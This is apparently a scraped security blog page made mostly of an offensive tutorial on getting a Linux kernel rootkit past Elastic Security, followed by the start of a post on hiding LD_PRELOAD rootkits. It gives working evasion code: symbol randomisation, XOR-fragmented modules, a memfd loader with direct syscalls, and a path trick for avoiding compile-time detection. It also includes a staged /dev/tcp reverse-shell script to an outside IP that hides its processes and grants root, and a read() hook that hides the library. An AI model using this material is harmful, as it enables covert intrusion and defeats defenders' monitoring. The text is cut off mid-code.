r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\u003c/p\u003e","title":"Evading Elastic Security: Linux Rootkit Detection Bypass"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, 